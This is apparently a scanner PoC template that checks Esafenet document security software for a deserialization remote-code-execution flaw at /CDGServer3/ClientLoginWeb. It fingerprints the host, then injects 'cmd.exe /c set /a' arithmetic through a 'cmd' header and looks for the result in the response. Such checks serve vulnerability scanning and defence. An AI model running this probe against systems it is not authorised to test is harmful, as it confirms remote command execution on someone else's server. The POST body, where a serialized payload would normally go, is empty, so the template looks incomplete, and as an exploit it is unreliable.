id: poc-yaml-yisaitong-esafenet-clientloginweb-unserialize
info:
  name: 亿赛通电子文档安全管理系统 ClientLoginWeb 反序列化漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: deserialization
variables:
  t1: "{{rand_int(111000, 999000)}}"
  t2: "{{rand_int(100, 1000)}}"
  t3: "{{to_number(t1) - to_number(t2)}}"
  command: |
    {{concat("cmd.exe /c set /a ", to_string(t1), " - ", to_string(t2))}}
http:
  - id: first-request
    method: GET
    path:
      - "{{BaseURL}}/CDGServer3/ClientLoginWeb"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "Freedom LiFe"
        part: body
  - id: second-request
    method: POST
    path:
      - "{{BaseURL}}/CDGServer3/ClientLoginWeb?command=GETSYSTEMINFO"
    headers:
      cmd: "{{command}}"
    body: |-
      
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t3}}"
        part: body
